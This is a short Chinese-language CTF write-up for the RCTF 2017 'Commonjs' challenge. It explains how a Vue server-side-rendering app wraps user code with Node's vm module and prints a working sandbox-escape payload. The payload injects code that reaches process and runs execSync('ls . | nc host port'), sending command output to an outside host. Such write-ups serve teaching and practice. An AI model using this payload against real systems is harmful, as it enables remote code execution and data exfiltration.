---
title: RCTF Commonjs Write Up
date: 2017-05-24T16:46:10+08:00
hideSummary: true
tags:
  - CTF
---

### Commonjs ( 2 solved )

题目的环境是 `Vue` + `SSR ( Server Side Render )` , 详细信息可以参照官方的示例 [Hacknews](https://github.com/vuejs/vue-hackernews-2.0)

辨别的方法也很简单，服务端渲染返回的 HTML 里会带有预填充信息，这里 Vue 的预填充标志是 `window.__INITIAL_STATE__`

触发漏洞的点

1. 将自己的 commonjs 代码保存，点击 Save 会跳转到 URL `/codes/:id`
2. 开启一个新的页面，利用模块导入和 `const m = require('id')` 将模块引入，再次保存
3. 利用服务端渲染得到结果，可以发现依赖的模块进行了一次包装

在客户端中，可以找到对代码进行包装的代码

```javascript
function warp (code) {
    try {
        const ret = eval(`(function (module, exports, require) { ${code} })`)
        if (typeof ret !== 'function') {
            throw new Error('type not valid')
        }
        return ret.toString()
    } catch (e) {
        return 'function (module, exports, require) {  }'
    }
}
```

同时因为服务端渲染的缘故，服务端也应该有一个**类似的包装函数，并且返回一致**。

这里同样可以利用官方示例进行分析（ `src/api/create-api-client.js` 、`src/api/create-api-server.js` ）

这里给出服务端包装函数代码，因为代码是在服务端跑，这里用的是官方提供的 [vm](https://nodejs.org/dist/latest-v7.x/docs/api/vm.html) 模块（利用构造 payload 从返回可以发现不是 `eval` 而是 `vm`）

```javascript
function warp (code) {
    try {
        const ret = vm.runInNewContext(`(function (module, exports, require) { ${code} })`, sandbox, { timeout: 500 })
        if (typeof ret !== 'function') {
            throw new Error('type not valid')
        }
        return ret.toString()
    } catch (e) {
        return 'function (module, exports, require) { }'
    }
}
```

由于 vm 模块是可以绕过的，可以直接构造代码进行 RCE，这里给出一种 payload

```javascript
// payload

"}, (() => { this.constructor.constructor('return process')().mainModule.require('child_process').execSync('ls . | nc host port') })(), {"
```
